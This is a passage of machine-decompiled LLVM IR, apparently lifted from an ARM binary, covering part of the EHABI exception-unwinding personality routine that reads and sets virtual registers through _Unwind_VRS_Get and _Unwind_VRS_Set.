  %v5_182b0 = call i32 @_Unwind_VRS_Get(i32 %v0_182a4, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_182b0, i32* %r0.global-to-local, align 4
  %v3_182b4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_182b4, i32* %r2.global-to-local, align 4
  %v0_182b8 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_182b8, %v3_182b4
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_182c4

._crit_edge:                                      ; preds = %bb152
  %v0_182dc.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_182c4:                               ; preds = %bb152
  %v0_182c4 = load i32, i32* @r6, align 4
  %v1_182c4 = and i32 %v0_182c4, -2
  %v2_182c8 = add i32 %v1_182c4, %v0_182b8
  %v3_182cc = icmp ult i32 %v3_182b4, %v2_182c8
  br i1 %v3_182cc, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_182c4
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_182c4
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_182dc = phi i32 [ %v0_182dc.pre, %._crit_edge ], [ %v0_182c4, %bb153 ], [ %v0_182c4, %.thread20 ]
  %v0_18484 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_182d8 = load i32, i32* @r5, align 4
  %v1_182dc = urem i32 %v0_182dc, 2
  %v1_182d8 = mul i32 %v0_182d8, 2
  %v3_182e0 = and i32 %v1_182d8, 2
  %v4_182e0 = or i32 %v3_182e0, %v1_182dc
  store i32 %v4_182e0, i32* %r2.global-to-local, align 4
  %v7_182e4 = icmp eq i32 %v4_182e0, 1
  br i1 %v7_182e4, label %dec_label_pc_18478, label %dec_label_pc_182ec

dec_label_pc_182ec:                               ; preds = %bb154
  %v2_182e4 = icmp eq i32 %v4_182e0, 0
  br i1 %v2_182e4, label %dec_label_pc_182f0, label %dec_label_pc_183a0

dec_label_pc_182f0:                               ; preds = %dec_label_pc_182ec
  store i32 %v1_181f8, i32* %r2.global-to-local, align 4
  br i1 %v2_182f4, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_182f0
  %v0_18308119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_18308

bb155:                                            ; preds = %dec_label_pc_182f0
  %v2_18300 = icmp eq i32 %v0_18484, 0
  %v0_18308 = load i32, i32* @r7, align 4
  br i1 %v2_18300, label %dec_label_pc_18308, label %dec_label_pc_18680

dec_label_pc_18308:                               ; preds = %.thread, %bb155
  %v0_18308120 = phi i32 [ %v0_18308119, %.thread ], [ %v0_18308, %bb155 ]
  %v1_18308 = add i32 %v0_18308120, 4
  %v1_1830c = inttoptr i32 %v1_18308 to i32*
  %v2_1830c = load i32, i32* %v1_1830c, align 4
  %v2_18310 = icmp eq i32 %v2_1830c, 0
  br i1 %v2_18310, label %dec_label_pc_18318, label %dec_label_pc_18264

dec_label_pc_18318:                               ; preds = %dec_label_pc_1852c, %dec_label_pc_184f0, %dec_label_pc_18308, %dec_label_pc_18258.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_18258.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18308 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_184f0 ], [ %stack_var_-76.4, %dec_label_pc_1852c ]
  %v0_18318 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18318, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_18320 = call i32 @__gnu_unwind_execute(i32 %v0_18318, %anon_struct_13* %tmp156)
  store i32 %v4_18320, i32* %r0.global-to-local, align 4
  store i32 %v4_18320, i32* %r5.global-to-local, align 4
  %v2_18324 = icmp eq i32 %v4_18320, 0
  br i1 %v2_18324, label %dec_label_pc_1832c, label %dec_label_pc_183a8

dec_label_pc_1832c:                               ; preds = %dec_label_pc_18318
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_18330 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_18330, label %bb157, label %dec_label_pc_1833c

bb157:                                            ; preds = %dec_label_pc_1832c
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183ac

dec_label_pc_1833c:                               ; preds = %dec_label_pc_1832c
  %v2_1833c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1833c, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_1834c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1834c, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_18354 = call i32 @_Unwind_VRS_Get(i32 %v0_1834c, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_18358 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_1834c, i32* %r0.global-to-local, align 4
  %v5_1836c = call i32 @_Unwind_VRS_Set(i32 %v0_1834c, i32 %v0_18358, i32 14, i32 %v0_18358, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1836c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r2.global-to-local, align 4
  %v4_18378 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 32) to i32*), align 4
  %v0_1837c = load i32, i32* %r5.global-to-local, align 4
  %v0_18380 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18380, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_18378, i32* %stack_var_-48, align 4
  %v5_18394 = call i32 @_Unwind_VRS_Set(i32 %v0_18380, i32 %v0_1837c, i32 15, i32 %v0_1837c, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183ac

dec_label_pc_183a0:                               ; preds = %dec_label_pc_182ec
  %v7_183a0 = icmp eq i32 %v4_182e0, 2
  br i1 %v7_183a0, label %dec_label_pc_183b8, label %dec_label_pc_183a8

dec_label_pc_183a8:                               ; preds = %dec_label_pc_183a0, %dec_label_pc_1848c, %dec_label_pc_18318, %dec_label_pc_18680
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183ac

dec_label_pc_183ac:                               ; preds = %bb157, %dec_label_pc_186b8, %dec_label_pc_18648, %bb166, %dec_label_pc_1833c, %dec_label_pc_183a8
  %v1_183b4 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_186b8 ], [ %v1_183b4.pre, %dec_label_pc_18648 ], [ 7, %bb166 ], [ 7, %dec_label_pc_1833c ], [ 9, %dec_label_pc_183a8 ]
  store i32 %v3_181c8, i32* %r4.global-to-local, align 4
  store i32 %v6_181c8, i32* %r5.global-to-local, align 4
  ret i32 %v1_183b4

dec_label_pc_183b8:                               ; preds = %dec_label_pc_183a0
  store i32 %v1_181f8, i32* %r2.global-to-local, align 4
  %v0_183bc = load i32, i32* @r7, align 4
  %v1_183bc = inttoptr i32 %v0_183bc to i32*
  %v2_183bc = load i32, i32* %v1_183bc, align 4
  %tmp206 = bitcast i32 %v2_183bc to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_183c4 = bitcast float %tmp207 to i32
  store i32 %v1_183c4, i32* @sl, align 4
  br i1 %v2_182f4, label %dec_label_pc_183cc, label %dec_label_pc_18538

dec_label_pc_183cc:                               ; preds = %dec_label_pc_183b8
  %v2_183cc = icmp eq i32 %v0_18484, 0
  br i1 %v2_183cc, label %dec_label_pc_18520, label %dec_label_pc_183d4

dec_label_pc_183d4:                               ; preds = %dec_label_pc_183cc
  %v2_183d8 = icmp eq i32 %v1_183c4, 0
  br i1 %v2_183d8, label %dec_label_pc_183e4.thread, label %bb159

dec_label_pc_183e4.thread:                        ; preds = %dec_label_pc_183d4
  br label %dec_label_pc_18648

bb159:                                            ; preds = %dec_label_pc_183d4
  br i1 %v3_183dc, label %dec_label_pc_183ec, label %dec_label_pc_18520

dec_label_pc_183ec:                               ; preds = %bb159
  %v1_183ec = add i32 %v0_183bc, 4
  store i32 %v1_183ec, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_183fc = load i32, i32* @r8, align 4
  %v1_183fc = add i32 %v0_183fc, 88
  store i32 %v1_183fc, i32* %sb.global-to-local, align 4
  store i32 %v1_183ec, i32* @r4, align 4
  br label %dec_label_pc_18420

dec_label_pc_18410:                               ; preds = %bb161
  %v1_18410 = add i32 %v0_18410, 1
  store i32 %v1_18410, i32* @r5, align 4
  %v1_18414 = load i32, i32* @sl, align 4
  %v9_18414 = icmp eq i32 %v1_18410, %v1_18414
  %v0_18418 = load i32, i32* @r4, align 4
  %v1_18418 = add i32 %v0_18418, 4
  store i32 %v1_18418, i32* @r4, align 4
  br i1 %v9_18414, label %dec_label_pc_18648, label %dec_label_pc_18410.dec_label_pc_18420_crit_edge

dec_label_pc_18410.dec_label_pc_18420_crit_edge:  ; preds = %dec_label_pc_18410
  %v0_1842c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18420

dec_label_pc_18420:                               ; preds = %dec_label_pc_18410.dec_label_pc_18420_crit_edge, %dec_label_pc_183ec
  %v0_1842c = phi i32 [ %v0_1842c.pre, %dec_label_pc_18410.dec_label_pc_18420_crit_edge ], [ %v1_183fc, %dec_label_pc_183ec ]
  %v1_18430 = phi i32 [ %v1_18418, %dec_label_pc_18410.dec_label_pc_18420_crit_edge ], [ %v1_183ec, %dec_label_pc_183ec ]
  %v1_18420 = inttoptr i32 %v1_18430 to i32*
  %v2_18420 = load i32, i32* %v1_18420, align 4
  %v2_18424 = icmp eq i32 %v2_18420, 0
  store i32 %v0_1842c, i32* %forced_unwind_-44, align 4
  br i1 %v2_18424, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_18420
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_18420, %bb160
  %v0_18434 = load i32, i32* @r8, align 4
  store i32 %v0_18434, i32* %r0.global-to-local, align 4
  store i32 %v2_184c0, i32* %r2.global-to-local, align 4
  %v4_18444 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 100) to i32*), align 4
  store i32 99408, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18444)
  %v0_18450 = load i32, i32* %r0.global-to-local, align 4
  %v2_18450 = icmp eq i32 %v0_18450, 0
  %v0_18410 = load i32, i32* @r5, align 4
  br i1 %v2_18450, label %dec_label_pc_18410, label %dec_label_pc_18458

dec_label_pc_18458:                               ; preds = %bb161
  %v1_18458 = load i32, i32* @sl, align 4
  %v9_18458 = icmp eq i32 %v0_18410, %v1_18458
  br i1 %v9_18458, label %dec_label_pc_18648, label %dec_label_pc_18460

dec_label_pc_18460:                               ; preds = %dec_label_pc_18458
  %v0_18460 = load i32, i32* @r7, align 4
  %v1_18460 = inttoptr i32 %v0_18460 to i32*
  %v2_18460 = load i32, i32* %v1_18460, align 4
  %v1_18464 = icmp slt i32 %v2_18460, 0
  %v0_1846c.pre = load i32, i32* @r6, align 4
  br i1 %v1_18464, label %dec_label_pc_1846c, label %dec_label_pc_1852c

dec_label_pc_1846c:                               ; preds = %dec_label_pc_18460, %dec_label_pc_18524
  %v0_1846c = phi i32 [ %storemerge, %dec_label_pc_18524 ], [ %v0_1846c.pre, %dec_label_pc_18460 ]
  store i32 %v0_1846c, i32* %r0.global-to-local, align 4
  %v1_18470 = add i32 %v0_1846c, 4
  store i32 %v1_18470, i32* @r6, align 4
  br label %dec_label_pc_1852c

dec_label_pc_18478:                               ; preds = %bb154
  store i32 %v1_181f8, i32* %r2.global-to-local, align 4
  br i1 %v2_182f4, label %dec_label_pc_18484, label %dec_label_pc_18570

dec_label_pc_18484:                               ; preds = %dec_label_pc_18478
  %v2_18484 = icmp eq i32 %v0_18484, 0
  br i1 %v2_18484, label %dec_label_pc_184f0, label %dec_label_pc_1848c

dec_label_pc_1848c:                               ; preds = %dec_label_pc_18484
  %v0_1848c = load i32, i32* @r7, align 4
  %v1_1848c = add i32 %v0_1848c, 4
  %v2_1848c = inttoptr i32 %v1_1848c to i32*
  %v3_1848c = load i32, i32* %v2_1848c, align 4
  %v7_18490 = icmp eq i32 %v3_1848c, -2
  store i32 %v1_1848c, i32* %r2.global-to-local, align 4
  br i1 %v7_18490, label %dec_label_pc_183a8, label %dec_label_pc_1849c

dec_label_pc_1849c:                               ; preds = %dec_label_pc_1848c
  %v0_1849c = load i32, i32* @r8, align 4
  %v1_1849c = add i32 %v0_1849c, 88
  %v7_184a0 = icmp eq i32 %v3_1848c, -1
  store i32 %v1_1849c, i32* %forced_unwind_-44, align 4
  br i1 %v7_184a0, label %dec_label_pc_184e4, label %dec_label_pc_184ac

dec_label_pc_184ac:                               ; preds = %dec_label_pc_1849c
  %v2_184b0 = icmp eq i32 %v3_1848c, 0
  br i1 %v2_184b0, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_184ac
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_184ac, %bb162
  store i32 %v0_1849c, i32* %r0.global-to-local, align 4
  store i32 %v2_184c0, i32* %r2.global-to-local, align 4
  %v4_184cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 100) to i32*), align 4
  store i32 99544, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_184cc)
  %v0_184d8 = load i32, i32* %r0.global-to-local, align 4
  %v2_184d8 = icmp eq i32 %v0_184d8, 0
  br i1 %v2_184d8, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_184e4.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_184e4

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_184f0

dec_label_pc_184e4:                               ; preds = %.thread25, %dec_label_pc_1849c
  %v3_184e4 = phi i32 [ %v3_184e4.pr, %.thread25 ], [ %v1_1849c, %dec_label_pc_1849c ]
  %v2_184e8 = icmp eq i32 %v3_184e4, 0
  br i1 %v2_184e8, label %dec_label_pc_184f0, label %dec_label_pc_18648

dec_label_pc_184f0:                               ; preds = %bb164, %dec_label_pc_1859c, %dec_label_pc_18570, %dec_label_pc_184e4, %dec_label_pc_18484
  %v0_184f0 = load i32, i32* @r7, align 4
  %v1_184f0 = add i32 %v0_184f0, 8
  %v1_18258 = inttoptr i32 %v1_184f0 to i32*
  %v2_18258 = load i32, i32* %v1_18258, align 4
  %v2_1825c = icmp eq i32 %v2_18258, 0
  br i1 %v2_1825c, label %dec_label_pc_18318, label %dec_label_pc_18264.preheader

dec_label_pc_184f8:                               ; preds = %entry
  %v3_184f8 = udiv i32 %v2_181ec, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_18508 = mul nuw nsw i32 %v3_184f8, 4
  %v3_1850c = mul i32 %v2_181ec, 65536
  %v2_18510 = add i32 %v6_18508, %v4_181ec
  store i32 %v3_1850c, i32* %v4_1820c, align 8
  br label %dec_label_pc_18234

dec_label_pc_18520:                               ; preds = %bb159, %dec_label_pc_183cc
  %v1_18520 = add i32 %v0_183bc, 4
  br label %dec_label_pc_18524

dec_label_pc_18524:                               ; preds = %dec_label_pc_18564, %dec_label_pc_18520
  %v0_18524 = phi i32 [ %v2_18564, %dec_label_pc_18564 ], [ %v2_183bc, %dec_label_pc_18520 ]
  %storemerge = phi i32 [ %v4_18564, %dec_label_pc_18564 ], [ %v1_18520, %dec_label_pc_18520 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_18524 = icmp slt i32 %v0_18524, 0
  br i1 %v1_18524, label %dec_label_pc_1846c, label %dec_label_pc_1852c

dec_label_pc_1852c:                               ; preds = %dec_label_pc_18460, %dec_label_pc_18524, %dec_label_pc_18638, %dec_label_pc_1846c
  %v0_18530 = phi i32 [ %v1_18470, %dec_label_pc_1846c ], [ %storemerge, %dec_label_pc_18524 ], [ %v1_1863c, %dec_label_pc_18638 ], [ %v0_1846c.pre, %dec_label_pc_18460 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_1846c ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18524 ], [ %v1_18638, %dec_label_pc_18638 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18460 ]
  %v0_1852c = load i32, i32* @sl, align 4
  %v3_1852c = mul i32 %v0_1852c, 4
  %v2_18530 = add i32 %v3_1852c, %v0_18530
  %v1_1825865 = inttoptr i32 %v2_18530 to i32*
  %v2_1825866 = load i32, i32* %v1_1825865, align 4
  %v2_1825c68 = icmp eq i32 %v2_1825866, 0
  br i1 %v2_1825c68, label %dec_label_pc_18318, label %dec_label_pc_18264.preheader.lr.ph

dec_label_pc_18538:                               ; preds = %dec_label_pc_183b8
  %v0_18548 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18548, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18550 = load i32, i32* @r8, align 4
  %v1_18550 = add i32 %v0_18550, 32
  %v2_18550 = inttoptr i32 %v1_18550 to i32*
  %v3_18550 = load i32, i32* %v2_18550, align 4
  store i32 %v3_18550, i32* @r4, align 4
  %v5_18554 = call i32 @_Unwind_VRS_Get(i32 %v0_18548, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18554, i32* %r0.global-to-local, align 4
  %v3_18558 = load i32, i32* %stack_var_-48, align 4
  %v0_1855c = load i32, i32* @r4, align 4
  %v9_1855c = icmp eq i32 %v0_1855c, %v3_18558
  br i1 %v9_1855c, label %dec_label_pc_18604, label %dec_label_pc_18538.dec_label_pc_18564_crit_edge

dec_label_pc_18538.dec_label_pc_18564_crit_edge:  ; preds = %dec_label_pc_18538
  %v0_18564.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18564

dec_label_pc_18564:                               ; preds = %dec_label_pc_18538.dec_label_pc_18564_crit_edge, %dec_label_pc_18604
  %v0_18564 = phi i32 [ %v0_18564.pre, %dec_label_pc_18538.dec_label_pc_18564_crit_edge ], [ %v1_18608, %dec_label_pc_18604 ]
  %v1_18564 = inttoptr i32 %v0_18564 to i32*
  %v2_18564 = load i32, i32* %v1_18564, align 4
  %v4_18564 = add i32 %v0_18564, 4
  store i32 %v4_18564, i32* @r7, align 4
  br label %dec_label_pc_18524

dec_label_pc_18570:                               ; preds = %dec_label_pc_18478
  %v0_18580 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18580, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18588 = load i32, i32* @r8, align 4
  %v1_18588 = add i32 %v0_18588, 32
  %v2_18588 = inttoptr i32 %v1_18588 to i32*
  %v3_18588 = load i32, i32* %v2_18588, align 4
  store i32 %v3_18588, i32* @r4, align 4
  %v5_1858c = call i32 @_Unwind_VRS_Get(i32 %v0_18580, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1858c, i32* %r0.global-to-local, align 4
  %v3_18590 = load i32, i32* %stack_var_-48, align 4
  %v0_18594 = load i32, i32* @r4, align 4
  %v9_18594 = icmp eq i32 %v0_18594, %v3_18590
  br i1 %v9_18594, label %dec_label_pc_1859c, label %dec_label_pc_184f0

dec_label_pc_1859c:                               ; preds = %dec_label_pc_18570
  %v0_1859c = load i32, i32* @r8, align 4
  %v1_1859c = add i32 %v0_1859c, 40
  %v2_1859c = inttoptr i32 %v1_1859c to i32*
  %v3_1859c = load i32, i32* %v2_1859c, align 4
  %v1_185a0 = load i32, i32* @r7, align 4
  %v9_185a0 = icmp eq i32 %v3_1859c, %v1_185a0
  br i1 %v9_185a0, label %dec_label_pc_185a8, label %dec_label_pc_184f0

dec_label_pc_185a8:                               ; preds = %dec_label_pc_1859c
  %v1_185a8 = inttoptr i32 %v3_1859c to i32*
  %v2_185a8 = load i32, i32* %v1_185a8, align 4
  %v1_185ac = and i32 %v2_185a8, 1073741824
  %v2_185ac = icmp eq i32 %v1_185ac, 0
  br i1 %v2_185ac, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_185a8
  %v2_185b0 = or i32 %v2_185a8, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_185a8
  %tmp208 = bitcast i32 %v2_185a8 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_185b4 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_185b8 = phi i32 [ %v2_186e8, %.thread28 ], [ %v2_186e8, %bb169 ], [ %v3_1859c, %bb165 ], [ %v3_1859c, %.thread26 ]
  %v0_185b8 = phi i32 [ %v2_186f8, %.thread28 ], [ %v2_186f4, %bb169 ], [ %v2_185b0, %bb165 ], [ %v2_185b4, %.thread26 ]
  %v2_185b8 = add i32 %v0_185b8, %v1_185b8
  store i32 %v2_185b8, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_185d0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_185d0, i32* %r0.global-to-local, align 4
  %v5_185d8 = call i32 @_Unwind_VRS_Set(i32 %v0_185d0, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_185d0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_185f0 = load i32, i32* @r8, align 4
  store i32 %v0_185f0, i32* %stack_var_-48, align 4
  %v5_185f8 = call i32 @_Unwind_VRS_Set(i32 %v0_185d0, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183ac

dec_label_pc_18604:                               ; preds = %dec_label_pc_18538
  %v0_18604 = load i32, i32* @r8, align 4
  %v1_18604 = add i32 %v0_18604, 40
  %v2_18604 = inttoptr i32 %v1_18604 to i32*
  %v3_18604 = load i32, i32* %v2_18604, align 4
  %v1_18608 = load i32, i32* @r7, align 4
  %v9_18608 = icmp eq i32 %v3_18604, %v1_18608
  br i1 %v9_18608, label %dec_label_pc_18610, label %dec_label_pc_18564

dec_label_pc_18610:                               ; preds = %dec_label_pc_18604
  %v1_18614 = add i32 %v3_18604, 4
  store i32 %v1_18614, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_1861c = add i32 %v0_18604, 44
  %v3_1861c = inttoptr i32 %v2_1861c to i32*
  store i32 0, i32* %v3_1861c, align 4
  %v0_18620 = load i32, i32* %r2.global-to-local, align 4
  %v1_18620 = load i32, i32* @r8, align 4
  %v2_18620 = add i32 %v1_18620, 48
  %v3_18620 = inttoptr i32 %v2_18620 to i32*
  store i32 %v0_18620, i32* %v3_18620, align 4
  %v0_18624 = load i32, i32* @sl, align 4
  %v1_18624 = load i32, i32* @r8, align 4
  %v2_18624 = add i32 %v1_18624, 40
  %v3_18624 = inttoptr i32 %v2_18624 to i32*
  store i32 %v0_18624, i32* %v3_18624, align 4
  %v0_18628 = load i32, i32* %r0.global-to-local, align 4
  %v1_18628 = load i32, i32* @r8, align 4
  %v2_18628 = add i32 %v1_18628, 52
  %v3_18628 = inttoptr i32 %v2_18628 to i32*
  store i32 %v0_18628, i32* %v3_18628, align 4
  %v0_1862c = load i32, i32* @r7, align 4
  %v1_1862c = inttoptr i32 %v0_1862c to i32*
  %v2_1862c = load i32, i32* %v1_1862c, align 4
  %v1_18630 = icmp slt i32 %v2_1862c, 0
  br i1 %v1_18630, label %dec_label_pc_18638, label %dec_label_pc_186e4

dec_label_pc_18638:                               ; preds = %dec_label_pc_18610
  %v0_18638 = load i32, i32* %r2.global-to-local, align 4
  %v1_18638 = add i32 %v0_18638, -3
  store i32 %v1_18638, i32* %r2.global-to-local, align 4
  %v0_1863c = load i32, i32* %r0.global-to-local, align 4
  %v1_1863c = add i32 %v0_1863c, 4
  store i32 %v1_1863c, i32* @r6, align 4
  br label %dec_label_pc_1852c

dec_label_pc_18648:                               ; preds = %dec_label_pc_18458, %dec_label_pc_184e4, %dec_label_pc_18410, %dec_label_pc_183e4.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18658 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18658, i32* %r0.global-to-local, align 4
  %v5_18660 = call i32 @_Unwind_VRS_Get(i32 %v0_18658, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_18664 = load i32, i32* @r7, align 4
  %v1_18664 = load i32, i32* @r8, align 4
  %v2_18664 = add i32 %v1_18664, 40
  %v3_18664 = inttoptr i32 %v2_18664 to i32*
  store i32 %v0_18664, i32* %v3_18664, align 4
  %v3_18668 = load i32, i32* %stack_var_-48, align 4
  %v3_1866c = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_1866c, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_18674 = load i32, i32* @r8, align 4
  %v2_18674 = add i32 %v1_18674, 32
  %v3_18674 = inttoptr i32 %v2_18674 to i32*
  store i32 %v3_18668, i32* %v3_18674, align 4
  %v0_18678 = load i32, i32* %r2.global-to-local, align 4
  %v1_18678 = load i32, i32* @r8, align 4
  %v2_18678 = add i32 %v1_18678, 36
  %v3_18678 = inttoptr i32 %v2_18678 to i32*
  store i32 %v0_18678, i32* %v3_18678, align 4
  %v1_183b4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183ac

dec_label_pc_18680:                               ; preds = %bb155
  %v1_18680 = inttoptr i32 %v0_18308 to i32*
  %v2_18680 = load i32, i32* %v1_18680, align 4
  %v1_18684 = add i32 %v0_18308, 4
  %v1_18688 = and i32 %v2_18680, 1073741824
  %v2_18688 = icmp eq i32 %v1_18688, 0
  %v2_1868c = or i32 %v2_18680, -2147483648
  %tmp210 = bitcast i32 %v2_18680 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_18690 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_18688, i32 %v2_18690, i32 %v2_1868c
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_18694 = load i32, i32* @r8, align 4
  %v2_18694 = add i32 %v1_18694, 56
  %v3_18694 = inttoptr i32 %v2_18694 to i32*
  store i32 %v1_18684, i32* %v3_18694, align 4
  %v0_18698 = load i32, i32* @r8, align 4
  store i32 %v0_18698, i32* %r0.global-to-local, align 4
  %v4_186a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 28) to i32*), align 4
  store i32 100016, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_186a4)
  %v0_186b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_186b0 = icmp eq i32 %v0_186b0, 0
  br i1 %v2_186b0, label %dec_label_pc_183a8, label %dec_label_pc_186b8

dec_label_pc_186b8:                               ; preds = %dec_label_pc_18680
  %v0_186b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_186b8 = load i32, i32* @r7, align 4
  %v2_186b8 = add i32 %v1_186b8, %v0_186b8
  store i32 %v2_186b8, i32* %stack_var_-48, align 4
  %v0_186c8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_186c8, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_186d8 = call i32 @_Unwind_VRS_Set(i32 %v0_186c8, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183ac

dec_label_pc_186e4:                               ; preds = %dec_label_pc_18610
  %v0_186e4 = load i32, i32* @sl, align 4
  %v3_186e4 = mul i32 %v0_186e4, 4
  %v0_186e8 = load i32, i32* %r0.global-to-local, align 4
  %v2_186e8 = add i32 %v0_186e8, %v3_186e4
  %v3_186e8 = inttoptr i32 %v2_186e8 to i32*
  %v4_186e8 = load i32, i32* %v3_186e8, align 4
  %v1_186ec = and i32 %v4_186e8, 1073741824
  %v2_186ec = icmp eq i32 %v1_186ec, 0
  br i1 %v2_186ec, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_186e4
  %v2_186f4 = or i32 %v4_186e8, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_186e4
  %tmp212 = bitcast i32 %v4_186e8 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_186f8 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_186e8, { 2, 1, 0 }
  uselistorder i32 %v1_1863c, { 1, 0 }
  uselistorder i32 %v1_18638, { 1, 0 }
  uselistorder i32 %v1_18608, { 1, 0 }
  uselistorder i32 %v0_185d0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1859c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_18564, { 1, 0 }
  uselistorder i32 %v0_18564, { 1, 0 }
  uselistorder i32 %v2_1825866, { 1, 0 }
  uselistorder i32 %v2_18530, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_18258, { 1, 0 }
  uselistorder i32 %v1_184f0, { 1, 0 }
  uselistorder i32 %v3_1848c, { 2, 0, 1 }
  uselistorder i32 %v0_1846c, { 1, 0 }
  uselistorder i32 %v0_1846c.pre, { 1, 0 }
  uselistorder i32 %v1_183c4, { 1, 0 }
  uselistorder i32 %v2_183bc, { 1, 0 }
